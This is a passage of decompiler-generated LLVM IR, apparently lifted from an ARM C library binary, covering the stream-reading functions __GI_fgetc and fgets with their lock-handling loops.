  %v2_17584 = inttoptr i32 %v1_17584 to i32*
  %v3_17584 = load i32, i32* %v2_17584, align 4
  %v1_17588 = add i32 %v0_17584, 16
  %v2_17588 = inttoptr i32 %v1_17588 to i32*
  %v3_17588 = load i32, i32* %v2_17588, align 4
  %v2_1758c = sub i32 %v3_17588, %v3_17584
  %v2_17590 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_17590, i32* @r4, align 4
  ret i32 %v2_1758c

; uselistorder directives
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__GI_fgetc(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_17598 = load i32, i32* @r4, align 4
  store i32 %v3_17598, i32* %stack_var_-20, align 4
  %v6_17598 = load i32, i32* @r5, align 4
  %v9_17598 = load i32, i32* @r6, align 4
  %v12_17598 = load i32, i32* @r7, align 4
  %v15_17598 = load i32, i32* @lr, align 4
  %v1_1759c = add i32 %arg1, 52
  %v2_1759c = inttoptr i32 %v1_1759c to i32*
  %v3_1759c = load i32, i32* %v2_1759c, align 4
  store i32 %v3_1759c, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_175a0 = icmp eq i32 %v3_1759c, 0
  store i32 %arg1, i32* @r7, align 4
  br i1 %v2_175a0, label %dec_label_pc_175d4, label %dec_label_pc_175b0

dec_label_pc_175b0:                               ; preds = %entry
  %v1_175b0 = add i32 %arg1, 16
  %v2_175b0 = inttoptr i32 %v1_175b0 to i32*
  %v3_175b0 = load i32, i32* %v2_175b0, align 4
  store i32 %v3_175b0, i32* %r2.global-to-local, align 4
  %v1_175b4 = add i32 %arg1, 24
  %v2_175b4 = inttoptr i32 %v1_175b4 to i32*
  %v3_175b4 = load i32, i32* %v2_175b4, align 4
  store i32 %v3_175b4, i32* %r3.global-to-local, align 4
  %v3_175b8 = icmp uge i32 %v3_175b0, %v3_175b4
  store i1 %v3_175b8, i1* %cpsr_c.global-to-local, align 1
  br i1 %v3_175b8, label %dec_label_pc_175c8, label %.thread

.thread:                                          ; preds = %dec_label_pc_175b0
  %v2_175bc = inttoptr i32 %v3_175b0 to i8*
  %v3_175bc = load i8, i8* %v2_175bc, align 1
  %v4_175bc = zext i8 %v3_175bc to i32
  store i32 %v4_175bc, i32* %r5.global-to-local, align 4
  %v6_175bc = add i32 %v3_175b0, 1
  store i32 %v6_175bc, i32* %r2.global-to-local, align 4
  store i32 %v6_175bc, i32* %v2_175b0, align 4
  br label %dec_label_pc_176cc

dec_label_pc_175c8:                               ; preds = %dec_label_pc_175b0
  %v1_175c8 = inttoptr i32 %arg1 to i16*
  %v2_175c8 = call i32 @getc_unlocked(i16* %v1_175c8)
  store i32 %v2_175c8, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_176cc

dec_label_pc_175d4:                               ; preds = %entry
  %v0_175d4 = call i32 @__aeabi_read_tp()
  %v0_175d8 = load i32, i32* @r7, align 4
  %v1_175d8 = add i32 %v0_175d8, 64
  %v2_175d8 = inttoptr i32 %v1_175d8 to i32*
  %v3_175d8 = load i32, i32* %v2_175d8, align 4
  store i32 %v3_175d8, i32* %r3.global-to-local, align 4
  %v1_175dc = add i32 %v0_175d4, -1168
  store i32 %v1_175dc, i32* @r6, align 4
  %v3_175e0 = icmp uge i32 %v3_175d8, %v1_175dc
  store i1 %v3_175e0, i1* %cpsr_c.global-to-local, align 1
  %v9_175e0 = icmp eq i32 %v3_175d8, %v1_175dc
  br i1 %v9_175e0, label %dec_label_pc_17628, label %dec_label_pc_175e8

dec_label_pc_175e8:                               ; preds = %dec_label_pc_175d4
  %v1_175e8 = add i32 %v0_175d8, 56
  store i32 %v1_175e8, i32* @r5, align 4
  store i32 %v1_175e8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_175f4

dec_label_pc_175f4:                               ; preds = %dec_label_pc_17600.dec_label_pc_175f4_crit_edge, %dec_label_pc_175e8
  %v0_175f4 = phi i32 [ %v0_175f4.pre, %dec_label_pc_17600.dec_label_pc_175f4_crit_edge ], [ %v1_175e8, %dec_label_pc_175e8 ]
  %v1_175f4 = inttoptr i32 %v0_175f4 to i32*
  %v2_175f4 = load i32, i32* %v1_175f4, align 4
  store i32 %v2_175f4, i32* %r3.global-to-local, align 4
  %v1_175f8 = load i32, i32* @r4, align 4
  %v3_175f8 = icmp uge i32 %v2_175f4, %v1_175f8
  store i1 %v3_175f8, i1* %cpsr_c.global-to-local, align 1
  %v9_175f8 = icmp eq i32 %v2_175f4, %v1_175f8
  br i1 %v9_175f8, label %dec_label_pc_17600, label %dec_label_pc_17618

dec_label_pc_17600:                               ; preds = %dec_label_pc_175f4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17610 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17610, label %dec_label_pc_17614, label %dec_label_pc_17600.dec_label_pc_175f4_crit_edge

dec_label_pc_17600.dec_label_pc_175f4_crit_edge:  ; preds = %dec_label_pc_17600
  %v0_175f4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_175f4

dec_label_pc_17614:                               ; preds = %dec_label_pc_17600
  %v0_17614 = load i32, i32* @r4, align 4
  store i32 %v0_17614, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17618

dec_label_pc_17618:                               ; preds = %dec_label_pc_175f4, %dec_label_pc_17614
  %v0_17618 = phi i32 [ %v0_17614, %dec_label_pc_17614 ], [ %v2_175f4, %dec_label_pc_175f4 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17618 = icmp eq i32 %v0_17618, 0
  br i1 %v2_17618, label %bb18, label %bb

bb:                                               ; preds = %dec_label_pc_17618
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_17618, %bb
  store i32 95780, i32* @lr, align 4
  %v1_17620 = xor i1 %v2_17618, true
  call void @__pseudo_cond_branch(i1 %v1_17620, i32 ptrtoint (i32* @global_var_15400.643 to i32))
  %v0_17624 = load i32, i32* @r6, align 4
  %v1_17624 = load i32, i32* @r7, align 4
  %v2_17624 = add i32 %v1_17624, 64
  %v3_17624 = inttoptr i32 %v2_17624 to i32*
  store i32 %v0_17624, i32* %v3_17624, align 4
  %v0_17628.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_17628

dec_label_pc_17628:                               ; preds = %dec_label_pc_175d4, %bb18
  %v1_17638 = phi i32 [ %v0_175d8, %dec_label_pc_175d4 ], [ %v0_17628.pre, %bb18 ]
  %v1_17628 = add i32 %v1_17638, 60
  %v2_17628 = inttoptr i32 %v1_17628 to i32*
  %v3_17628 = load i32, i32* %v2_17628, align 4
  store i32 %v3_17628, i32* %r2.global-to-local, align 4
  %v1_1762c = add i32 %v1_17638, 16
  %v2_1762c = inttoptr i32 %v1_1762c to i32*
  %v3_1762c = load i32, i32* %v2_1762c, align 4
  store i32 %v3_1762c, i32* @r1, align 4
  %v1_17630 = add i32 %v1_17638, 24
  %v2_17630 = inttoptr i32 %v1_17630 to i32*
  %v3_17630 = load i32, i32* %v2_17630, align 4
  store i32 %v3_17630, i32* %r3.global-to-local, align 4
  %v1_17634 = add i32 %v3_17628, 1
  store i32 %v1_17634, i32* %r2.global-to-local, align 4
  store i32 %v1_17634, i32* %v2_17628, align 4
  %v0_1763c = load i32, i32* @r1, align 4
  %v1_1763c = load i32, i32* %r3.global-to-local, align 4
  %v3_1763c = icmp uge i32 %v0_1763c, %v1_1763c
  store i1 %v3_1763c, i1* %cpsr_c.global-to-local, align 1
  br i1 %v3_1763c, label %dec_label_pc_1764c, label %.thread2

.thread2:                                         ; preds = %dec_label_pc_17628
  %v2_17640 = inttoptr i32 %v0_1763c to i8*
  %v3_17640 = load i8, i8* %v2_17640, align 1
  %v4_17640 = zext i8 %v3_17640 to i32
  store i32 %v4_17640, i32* %r5.global-to-local, align 4
  %v6_17640 = add i32 %v0_1763c, 1
  store i32 %v6_17640, i32* @r1, align 4
  %v2_17644 = load i32, i32* @r7, align 4
  %v3_17644 = add i32 %v2_17644, 16
  %v4_17644 = inttoptr i32 %v3_17644 to i32*
  store i32 %v6_17640, i32* %v4_17644, align 4
  br label %dec_label_pc_17658

dec_label_pc_1764c:                               ; preds = %dec_label_pc_17628
  %v0_1764c = load i32, i32* @r7, align 4
  %v1_17650 = inttoptr i32 %v0_1764c to i16*
  %v2_17650 = call i32 @getc_unlocked(i16* %v1_17650)
  store i32 %v2_17650, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_17658

dec_label_pc_17658:                               ; preds = %.thread2, %dec_label_pc_1764c
  %v0_17658 = load i32, i32* @r7, align 4
  %v1_17658 = add i32 %v0_17658, 60
  %v2_17658 = inttoptr i32 %v1_17658 to i32*
  %v3_17658 = load i32, i32* %v2_17658, align 4
  %v1_1765c = add i32 %v3_17658, -1
  store i32 %v1_1765c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17660 = icmp eq i32 %v1_1765c, 0
  store i32 %v1_1765c, i32* %v2_17658, align 4
  br i1 %v2_17660, label %dec_label_pc_1766c, label %dec_label_pc_176cc

dec_label_pc_1766c:                               ; preds = %dec_label_pc_17658
  %v0_1766c = load i32, i32* %r3.global-to-local, align 4
  %v1_1766c = load i32, i32* @r7, align 4
  %v2_1766c = add i32 %v1_1766c, 64
  %v3_1766c = inttoptr i32 %v2_1766c to i32*
  store i32 %v0_1766c, i32* %v3_1766c, align 4
  %v0_17670 = load i32, i32* @r7, align 4
  %v1_17670 = add i32 %v0_17670, 56
  store i32 %v1_17670, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_17674

dec_label_pc_17674:                               ; preds = %dec_label_pc_176a4.dec_label_pc_17674_crit_edge, %dec_label_pc_1766c
  %v0_1767c = phi i32 [ %v0_1767c.pre, %dec_label_pc_176a4.dec_label_pc_17674_crit_edge ], [ %v1_17670, %dec_label_pc_1766c ]
  %v0_17674 = phi i32 [ %v0_17674.pre, %dec_label_pc_176a4.dec_label_pc_17674_crit_edge ], [ %v0_17670, %dec_label_pc_1766c ]
  %v1_17674 = add i32 %v0_17674, 56
  %v2_17674 = inttoptr i32 %v1_17674 to i32*
  %v3_17674 = load i32, i32* %v2_17674, align 4
  store i32 %v3_17674, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_1767c, i32* %r2.global-to-local, align 4
  %v1_1768022 = inttoptr i32 %v0_1767c to i32*
  %v2_1768023 = load i32, i32* %v1_1768022, align 4
  store i32 %v2_1768023, i32* %r3.global-to-local, align 4
  %v3_1768425 = icmp uge i32 %v2_1768023, %v3_17674
  store i1 %v3_1768425, i1* %cpsr_c.global-to-local, align 1
  %v9_1768431 = icmp eq i32 %v2_1768023, %v3_17674
  br i1 %v9_1768431, label %dec_label_pc_1768c, label %dec_label_pc_176a4

dec_label_pc_1768c:                               ; preds = %dec_label_pc_17674, %dec_label_pc_1768c.dec_label_pc_17680_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1769c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1769c, label %dec_label_pc_176a0, label %dec_label_pc_1768c.dec_label_pc_17680_crit_edge

dec_label_pc_1768c.dec_label_pc_17680_crit_edge:  ; preds = %dec_label_pc_1768c
  %v0_17680.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17684.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_17680 = inttoptr i32 %v0_17680.pre to i32*
  %v2_17680 = load i32, i32* %v1_17680, align 4
  store i32 %v2_17680, i32* %r3.global-to-local, align 4
  %v3_17684 = icmp uge i32 %v2_17680, %v1_17684.pre
  store i1 %v3_17684, i1* %cpsr_c.global-to-local, align 1
  %v9_17684 = icmp eq i32 %v2_17680, %v1_17684.pre
  br i1 %v9_17684, label %dec_label_pc_1768c, label %dec_label_pc_176a4

dec_label_pc_176a0:                               ; preds = %dec_label_pc_1768c
  %v0_176a0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_176a0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_176a4

dec_label_pc_176a4:                               ; preds = %dec_label_pc_17674, %dec_label_pc_1768c.dec_label_pc_17680_crit_edge, %dec_label_pc_176a0
  %v0_176ac = phi i32 [ %v0_176a0, %dec_label_pc_176a0 ], [ %v2_1768023, %dec_label_pc_17674 ], [ %v2_17680, %dec_label_pc_1768c.dec_label_pc_17680_crit_edge ]
  %v1_176a4 = phi i32 [ %v0_176a0, %dec_label_pc_176a0 ], [ %v3_17674, %dec_label_pc_17674 ], [ %v1_17684.pre, %dec_label_pc_1768c.dec_label_pc_17680_crit_edge ]
  %v3_176a4 = icmp uge i32 %v0_176ac, %v1_176a4
  store i1 %v3_176a4, i1* %cpsr_c.global-to-local, align 1
  %v9_176a4 = icmp eq i32 %v0_176ac, %v1_176a4
  br i1 %v9_176a4, label %dec_label_pc_176ac, label %dec_label_pc_176a4.dec_label_pc_17674_crit_edge

dec_label_pc_176a4.dec_label_pc_17674_crit_edge:  ; preds = %dec_label_pc_176a4
  %v0_17674.pre = load i32, i32* @r7, align 4
  %v0_1767c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_17674

dec_label_pc_176ac:                               ; preds = %dec_label_pc_176a4
  %v2_176ac = icmp ne i32 %v1_176a4, 0
  store i1 %v2_176ac, i1* %cpsr_c.global-to-local, align 1
  %v7_176b0 = icmp slt i32 %v1_176a4, 2
  br i1 %v7_176b0, label %dec_label_pc_176cc, label %dec_label_pc_176b4

dec_label_pc_176b4:                               ; preds = %dec_label_pc_176ac
  %v0_176b8 = load i32, i32* @r1, align 4
  %v1_176b8 = add i32 %v0_176b8, 129
  store i32 %v1_176b8, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_176cc

dec_label_pc_176cc:                               ; preds = %.thread, %dec_label_pc_17658, %dec_label_pc_176b4, %dec_label_pc_176ac, %dec_label_pc_175c8
  %v0_176cc = load i32, i32* %r5.global-to-local, align 4
  %v2_176d4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_176d4, i32* @r4, align 4
  store i32 %v6_17598, i32* @r5, align 4
  store i32 %v9_17598, i32* @r6, align 4
  store i32 %v12_17598, i32* @r7, align 4
  store i32 %v15_17598, i32* @lr, align 4
  ret i32 %v0_176cc

; uselistorder directives
  uselistorder i32 %v0_176a0, { 1, 0, 2 }
  uselistorder i32 %v1_17684.pre, { 0, 2, 1 }
  uselistorder i32 %v0_1763c, { 1, 0, 2 }
  uselistorder i32 %v1_17638, { 0, 2, 1 }
  uselistorder i32 %v1_175f8, { 1, 0 }
  uselistorder i32 %v3_175b0, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 13, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 11, 12, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 %arg1, { 3, 1, 0, 4, 2 }
  uselistorder label %dec_label_pc_176cc, { 2, 3, 1, 4, 0 }
  uselistorder label %dec_label_pc_176a4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1768c, { 1, 0 }
  uselistorder label %dec_label_pc_17658, { 1, 0 }
  uselistorder label %dec_label_pc_17628, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_17618, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_176dc = load i32, i32* @r4, align 4
  store i32 %v3_176dc, i32* %stack_var_-32, align 4
  %v6_176dc = load i32, i32* @r5, align 4
  %v9_176dc = load i32, i32* @r6, align 4
  %v12_176dc = load i32, i32* @r7, align 4
  %v15_176dc = load i32, i32* @r8, align 4
  %v24_176dc = load i32, i32* @lr, align 4
  %v1_176e0 = add i32 %arg3, 52
  %v2_176e0 = inttoptr i32 %v1_176e0 to i32*
  %v3_176e0 = load i32, i32* %v2_176e0, align 4
  store i32 %v3_176e0, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_176e4 = icmp eq i32 %v3_176e0, 0
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg1, i32* %sl.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  br i1 %v2_176e4, label %dec_label_pc_176f8, label %dec_label_pc_1775c

dec_label_pc_176f8:                               ; preds = %entry
  %v0_176f8 = call i32 @__aeabi_read_tp()
  %v1_176fc = add i32 %arg3, 64
  %v2_176fc = inttoptr i32 %v1_176fc to i32*
  %v3_176fc = load i32, i32* %v2_176fc, align 4
  store i32 %v3_176fc, i32* %r3.global-to-local, align 4
  %v1_17700 = add i32 %v0_176f8, -1168
  store i32 %v1_17700, i32* @r8, align 4
  %v3_17704 = icmp uge i32 %v3_176fc, %v1_17700
  store i1 %v3_17704, i1* %cpsr_c.global-to-local, align 1
  %v9_17704 = icmp eq i32 %v3_176fc, %v1_17700
  br i1 %v9_17704, label %dec_label_pc_17750, label %dec_label_pc_1770c

dec_label_pc_1770c:                               ; preds = %dec_label_pc_176f8
  %v1_1770c = add i32 %arg3, 56
  store i32 %v1_1770c, i32* @r5, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v1_1770c, i32* %r2.global-to-local, align 4
  %v0_17718 = load i32, i32* @r6, align 4
  store i32 %v0_17718, i32* @r4, align 4
  %v1_1771c36 = inttoptr i32 %v1_1770c to i32*
  %v2_1771c37 = load i32, i32* %v1_1771c36, align 4
  store i32 %v2_1771c37, i32* %r3.global-to-local, align 4
  %v3_1772039 = icmp uge i32 %v2_1771c37, %v0_17718
  store i1 %v3_1772039, i1* %cpsr_c.global-to-local, align 1
  %v9_1772045 = icmp eq i32 %v2_1771c37, %v0_17718
  br i1 %v9_1772045, label %dec_label_pc_17728, label %dec_label_pc_17740

dec_label_pc_17728:                               ; preds = %dec_label_pc_1770c, %dec_label_pc_17728.dec_label_pc_1771c_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17738 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17738, label %dec_label_pc_1773c, label %dec_label_pc_17728.dec_label_pc_1771c_crit_edge

dec_label_pc_17728.dec_label_pc_1771c_crit_edge:  ; preds = %dec_label_pc_17728
  %v0_1771c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17720.pre = load i32, i32* @r4, align 4
  %v1_1771c = inttoptr i32 %v0_1771c.pre to i32*
  %v2_1771c = load i32, i32* %v1_1771c, align 4
  store i32 %v2_1771c, i32* %r3.global-to-local, align 4
  %v3_17720 = icmp uge i32 %v2_1771c, %v1_17720.pre
  store i1 %v3_17720, i1* %cpsr_c.global-to-local, align 1
  %v9_17720 = icmp eq i32 %v2_1771c, %v1_17720.pre
  br i1 %v9_17720, label %dec_label_pc_17728, label %dec_label_pc_17740

dec_label_pc_1773c:                               ; preds = %dec_label_pc_17728
  %v0_1773c = load i32, i32* @r4, align 4
  store i32 %v0_1773c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17740

dec_label_pc_17740:                               ; preds = %dec_label_pc_1770c, %dec_label_pc_17728.dec_label_pc_1771c_crit_edge, %dec_label_pc_1773c
  %v0_17740 = phi i32 [ %v0_1773c, %dec_label_pc_1773c ], [ %v2_1771c37, %dec_label_pc_1770c ], [ %v2_1771c, %dec_label_pc_17728.dec_label_pc_1771c_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17740 = icmp eq i32 %v0_17740, 0
  br i1 %v2_17740, label %bb20, label %bb

bb:                                               ; preds = %dec_label_pc_17740
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_17740, %bb
  store i32 96076, i32* @lr, align 4
  %v1_17748 = xor i1 %v2_17740, true
  call void @__pseudo_cond_branch(i1 %v1_17748, i32 ptrtoint (i32* @global_var_15400.643 to i32))
  %v0_1774c = load i32, i32* @r8, align 4
  %v1_1774c = load i32, i32* @r7, align 4
  %v2_1774c = add i32 %v1_1774c, 64
  %v3_1774c = inttoptr i32 %v2_1774c to i32*
  store i32 %v0_1774c, i32* %v3_1774c, align 4
  br label %dec_label_pc_17750

dec_label_pc_17750:                               ; preds = %dec_label_pc_176f8, %bb20
  %v0_17750 = load i32, i32* @r7, align 4
  %v1_17750 = add i32 %v0_17750, 60
  %v2_17750 = inttoptr i32 %v1_17750 to i32*
  %v3_17750 = load i32, i32* %v2_17750, align 4
  %v1_17754 = add i32 %v3_17750, 1
  store i32 %v1_17754, i32* %r3.global-to-local, align 4
  store i32 %v1_17754, i32* %v2_17750, align 4
  %v0_1775c.pre = load i32, i32* %sl.global-to-local, align 4
  %v0_17760.pre = load i32, i32* %sb.global-to-local, align 4
  %v0_17764.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1775c

dec_label_pc_1775c:                               ; preds = %entry, %dec_label_pc_17750
  %v0_17764 = phi i32 [ %arg3, %entry ], [ %v0_17764.pre, %dec_label_pc_17750 ]
  %v0_17760 = phi i32 [ %arg2, %entry ], [ %v0_17760.pre, %dec_label_pc_17750 ]
  %v0_1775c = phi i32 [ %arg1, %entry ], [ %v0_1775c.pre, %dec_label_pc_17750 ]
  store i32 %v0_17760, i32* %r1.global-to-local, align 4
  store i32 %v0_17764, i32* %r2.global-to-local, align 4
  %v3_17768 = inttoptr i32 %v0_1775c to i8*
  %v4_17768 = call i32 @__GI_fgets_unlocked(i8* %v3_17768, i32 %v0_17760, i32 %v0_17764)
  %v0_1776c = load i32, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1776c = icmp eq i32 %v0_1776c, 0
  store i32 %v4_17768, i32* %r8.global-to-local, align 4
  br i1 %v2_1776c, label %dec_label_pc_17778, label %dec_label_pc_177ec

dec_label_pc_17778:                               ; preds = %dec_label_pc_1775c
  %v0_17778 = load i32, i32* @r7, align 4
  %v1_17778 = add i32 %v0_17778, 60
  %v2_17778 = inttoptr i32 %v1_17778 to i32*
  %v3_17778 = load i32, i32* %v2_17778, align 4
  %v1_1777c = add i32 %v3_17778, -1
  store i32 %v1_1777c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17780 = icmp eq i32 %v1_1777c, 0
  store i32 %v1_1777c, i32* %v2_17778, align 4
  br i1 %v2_17780, label %dec_label_pc_1778c, label %dec_label_pc_177ec

dec_label_pc_1778c:                               ; preds = %dec_label_pc_17778
  %v0_1778c = load i32, i32* %r3.global-to-local, align 4
  %v1_1778c = load i32, i32* @r7, align 4
  %v2_1778c = add i32 %v1_1778c, 64
  %v3_1778c = inttoptr i32 %v2_1778c to i32*
  store i32 %v0_1778c, i32* %v3_1778c, align 4
  %v0_17790 = load i32, i32* @r7, align 4
  %v1_17790 = add i32 %v0_17790, 56
  store i32 %v1_17790, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_17794

dec_label_pc_17794:                               ; preds = %dec_label_pc_177c4.dec_label_pc_17794_crit_edge, %dec_label_pc_1778c
  %v0_1779c = phi i32 [ %v0_1779c.pre, %dec_label_pc_177c4.dec_label_pc_17794_crit_edge ], [ %v1_17790, %dec_label_pc_1778c ]
  %v0_17794 = phi i32 [ %v0_17794.pre, %dec_label_pc_177c4.dec_label_pc_17794_crit_edge ], [ %v0_17790, %dec_label_pc_1778c ]
  %v1_17794 = add i32 %v0_17794, 56
  %v2_17794 = inttoptr i32 %v1_17794 to i32*
  %v3_17794 = load i32, i32* %v2_17794, align 4
  store i32 %v3_17794, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_1779c, i32* %r2.global-to-local, align 4
  %v1_177a024 = inttoptr i32 %v0_1779c to i32*
  %v2_177a025 = load i32, i32* %v1_177a024, align 4
  store i32 %v2_177a025, i32* %r3.global-to-local, align 4
  %v3_177a427 = icmp uge i32 %v2_177a025, %v3_17794
  store i1 %v3_177a427, i1* %cpsr_c.global-to-local, align 1
  %v9_177a433 = icmp eq i32 %v2_177a025, %v3_17794
  br i1 %v9_177a433, label %dec_label_pc_177ac, label %dec_label_pc_177c4

dec_label_pc_177ac:                               ; preds = %dec_label_pc_17794, %dec_label_pc_177ac.dec_label_pc_177a0_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_177bc = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_177bc, label %dec_label_pc_177c0, label %dec_label_pc_177ac.dec_label_pc_177a0_crit_edge

dec_label_pc_177ac.dec_label_pc_177a0_crit_edge:  ; preds = %dec_label_pc_177ac
  %v0_177a0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_177a4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_177a0 = inttoptr i32 %v0_177a0.pre to i32*
  %v2_177a0 = load i32, i32* %v1_177a0, align 4
  store i32 %v2_177a0, i32* %r3.global-to-local, align 4
  %v3_177a4 = icmp uge i32 %v2_177a0, %v1_177a4.pre
  store i1 %v3_177a4, i1* %cpsr_c.global-to-local, align 1
  %v9_177a4 = icmp eq i32 %v2_177a0, %v1_177a4.pre
  br i1 %v9_177a4, label %dec_label_pc_177ac, label %dec_label_pc_177c4

dec_label_pc_177c0:                               ; preds = %dec_label_pc_177ac
  %v0_177c0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_177c0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_177c4

dec_label_pc_177c4:                               ; preds = %dec_label_pc_17794, %dec_label_pc_177ac.dec_label_pc_177a0_crit_edge, %dec_label_pc_177c0
  %v0_177cc = phi i32 [ %v0_177c0, %dec_label_pc_177c0 ], [ %v2_177a025, %dec_label_pc_17794 ], [ %v2_177a0, %dec_label_pc_177ac.dec_label_pc_177a0_crit_edge ]
  %v1_177c4 = phi i32 [ %v0_177c0, %dec_label_pc_177c0 ], [ %v3_17794, %dec_label_pc_17794 ], [ %v1_177a4.pre, %dec_label_pc_177ac.dec_label_pc_177a0_crit_edge ]
  %v3_177c4 = icmp uge i32 %v0_177cc, %v1_177c4
  store i1 %v3_177c4, i1* %cpsr_c.global-to-local, align 1
  %v9_177c4 = icmp eq i32 %v0_177cc, %v1_177c4
  br i1 %v9_177c4, label %dec_label_pc_177cc, label %dec_label_pc_177c4.dec_label_pc_17794_crit_edge

dec_label_pc_177c4.dec_label_pc_17794_crit_edge:  ; preds = %dec_label_pc_177c4
  %v0_17794.pre = load i32, i32* @r7, align 4
  %v0_1779c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_17794

dec_label_pc_177cc:                               ; preds = %dec_label_pc_177c4
  %v2_177cc = icmp ne i32 %v1_177c4, 0
  store i1 %v2_177cc, i1* %cpsr_c.global-to-local, align 1
  %v7_177d0 = icmp slt i32 %v1_177c4, 2
  br i1 %v7_177d0, label %dec_label_pc_177ec, label %dec_label_pc_177d4

dec_label_pc_177d4:                               ; preds = %dec_label_pc_177cc
  %v0_177d8 = load i32, i32* %r1.global-to-local, align 4
  %v1_177d8 = add i32 %v0_177d8, 129
  store i32 %v1_177d8, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_177ec

dec_label_pc_177ec:                               ; preds = %dec_label_pc_17778, %dec_label_pc_1775c, %dec_label_pc_177d4, %dec_label_pc_177cc
  %v0_177ec = load i32, i32* %r8.global-to-local, align 4
  %v2_177f0 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_177f0, i32* %r4.global-to-local, align 4
  store i32 %v6_176dc, i32* @r5, align 4
  store i32 %v9_176dc, i32* @r6, align 4
  store i32 %v12_176dc, i32* @r7, align 4
  store i32 %v15_176dc, i32* @r8, align 4
  store i32 %v24_176dc, i32* @lr, align 4
  ret i32 %v0_177ec

; uselistorder directives
  uselistorder i32 %v0_177c0, { 1, 0, 2 }
  uselistorder i32 %v1_177a4.pre, { 0, 2, 1 }
  uselistorder i32 %v0_17760, { 1, 0 }
  uselistorder i32 %v0_17764, { 1, 0 }
  uselistorder i32 %v1_17720.pre, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 11, 4, 5, 6, 7, 9, 8, 12, 10 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 9, 10, 3, 4, 5, 6, 11, 12, 7, 8 }
